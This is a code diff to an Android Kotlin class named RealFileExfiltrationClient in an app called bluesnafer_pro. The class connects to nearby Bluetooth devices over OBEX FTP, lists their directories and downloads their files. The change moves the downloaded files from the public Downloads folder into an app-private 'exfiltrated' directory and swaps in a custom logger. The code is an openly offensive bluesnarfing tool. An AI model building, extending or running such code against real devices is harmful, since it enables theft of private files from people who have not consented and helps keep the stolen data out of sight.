@@ -1,8 +1,8 @@
 package com.bluesnafer_pro
 
 import android.bluetooth.*
+import android.content.Context
 import android.os.Build
-import android.util.Log
 import java.io.*
 import java.util.*
 import java.util.concurrent.CountDownLatch
@@ -17,12 +17,17 @@ object RealFileExfiltrationClient {
     private const val TAG = "RealFileExfiltration"
     private val OBEX_FTP_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
     private val executor = Executors.newCachedThreadPool()
+    private var appContext: Context? = null
+    
+    fun init(context: Context) {
+        appContext = context
+    }
     
     /**
      * Attempt to connect to OBEX FTP service and list root directory
      */
     fun attemptFileConnection(device: BluetoothDevice, onLog: (String) -> Unit): Map<String, Any> {
-        Log.d(TAG, "Attempting OBEX FTP connection to ${device.address}")
+        BluesnaferLogger.d(TAG, "Attempting OBEX FTP connection to ${device.address}")
         onLog("[OBEX] Connecting to OBEX FTP service...")
         
         return try {
@@ -114,7 +119,7 @@ object RealFileExfiltrationClient {
                 return mapOf("success" to false, "error" to "No response")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "OBEX connection error: ${e.message}")
+            BluesnaferLogger.e(TAG, "OBEX connection error: ${e.message}")
             onLog("[OBEX] ✗ Connection failed: ${e.message}")
             return mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
         }
@@ -124,7 +129,7 @@ object RealFileExfiltrationClient {
      * List directory contents via OBEX FTP
      */
     fun listDirectory(device: BluetoothDevice, dirPath: String, onLog: (String) -> Unit, callback: (List<String>?) -> Unit): Map<String, Any> {
-        Log.d(TAG, "Listing directory: $dirPath")
+        BluesnaferLogger.d(TAG, "Listing directory: $dirPath")
         onLog("[OBEX] Listing directory: $dirPath")
         
         return try {
@@ -214,7 +219,7 @@ object RealFileExfiltrationClient {
                 "count" to files.size
             )
         } catch (e: Exception) {
-            Log.e(TAG, "List directory error: ${e.message}")
+            BluesnaferLogger.e(TAG, "List directory error: ${e.message}")
             onLog("[OBEX] ✗ Failed to list directory: ${e.message}")
             callback(emptyList())
             return mapOf("success" to false, "error" to (e.message ?: "Unknown error"), "files" to emptyList<String>())
@@ -225,7 +230,7 @@ object RealFileExfiltrationClient {
      * Download a file via OBEX FTP
      */
     fun downloadFile(device: BluetoothDevice, fileName: String, onLog: (String) -> Unit): Map<String, Any> {
-        Log.d(TAG, "Downloading file: $fileName")
+        BluesnaferLogger.d(TAG, "Downloading file: $fileName")
         onLog("[OBEX] Downloading: $fileName")
         
         return try {
@@ -274,15 +279,19 @@ object RealFileExfiltrationClient {
             socket.close()
             
             if (totalBytes > 0) {
-                // Save file
-                val downloadsDir = File("/storage/emulated/0/Download/BlueSnafer")
-                if (!downloadsDir.exists()) {
-                    downloadsDir.mkdirs()
+                // Save file to internal storage: /data/data/com.bluesnafer_pro/files/exfiltrated/
+                val ctx = appContext ?: throw IllegalStateException("Context not initialized")
+                val internalDir = File(ctx.filesDir, "exfiltrated")
+                if (!internalDir.exists()) {
+                    internalDir.mkdirs()
                 }
                 
-                val localFile = File(downloadsDir, fileName.substringAfterLast("/"))
-                FileOutputStream(localFile).use { fos ->
+                val localFile = File(internalDir, fileName.substringAfterLast("/"))
+                val fos = FileOutputStream(localFile)
+                try {
                     fos.write(fileData.toByteArray())
+                } finally {
+                    fos.close()
                 }
                 
                 onLog("[OBEX] ✓ Downloaded: ${localFile.name} (${totalBytes} bytes)")
@@ -297,7 +306,7 @@ object RealFileExfiltrationClient {
                 return mapOf("success" to false, "error" to "No data received")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Download error: ${e.message}")
+            BluesnaferLogger.e(TAG, "Download error: ${e.message}")
             onLog("[OBEX] ✗ Download failed: ${e.message}")
             return mapOf("success" to false, "error" to (e.message ?: "Unknown error"))
         }
